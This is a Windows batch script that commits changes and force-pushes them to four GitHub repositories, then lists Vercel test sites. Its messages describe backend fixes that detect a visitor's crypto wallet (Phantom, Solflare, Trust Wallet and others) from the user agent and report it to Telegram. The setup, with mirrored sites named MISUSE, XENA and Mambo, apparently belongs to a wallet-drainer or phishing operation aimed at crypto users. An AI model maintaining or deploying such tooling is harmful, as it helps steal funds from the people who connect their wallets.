@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing backend wallet type detection...
echo.
echo Issues found:
echo - Backend was not passing wallet type to Telegram logging
echo - User agent detection was working but not being used for logging
echo - Frontend wallet type was being overridden by backend
echo.
echo Fixes applied:
echo - Added wallet type detection from user agent in backend
echo - Backend now detects: Phantom, Solflare, Backpack, Glow, Exodus, Trust Wallet
echo - Backend passes detected wallet type to Telegram logging
echo - Fixed the missing wallet type parameter in logWalletDetected call
echo.
echo Committing backend wallet detection fixes...
git add .
git commit -m "FIX: Backend wallet type detection - now passes detected wallet type to Telegram"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing backend wallet detection fixes to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Backend wallet detection fixes pushed to all repositories.
echo.
echo Summary:
echo - Backend now detects wallet type from user agent
echo - Backend passes wallet type to Telegram logging
echo - Wallet type should now show in Telegram messages
echo - Both frontend and backend contribute to wallet type detection
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Test all wallet types:
echo 1. Phantom - should show "Type: Phantom"
echo 2. Solflare - should show "Type: Solflare"
echo 3. Backpack - should show "Type: Backpack"
echo 4. Glow - should show "Type: Glow"
echo 5. Trust Wallet - should show "Type: Trust Wallet"
echo 6. Exodus - should show "Type: Exodus"
echo.
echo The wallet type should now be detected and reported correctly!
pause
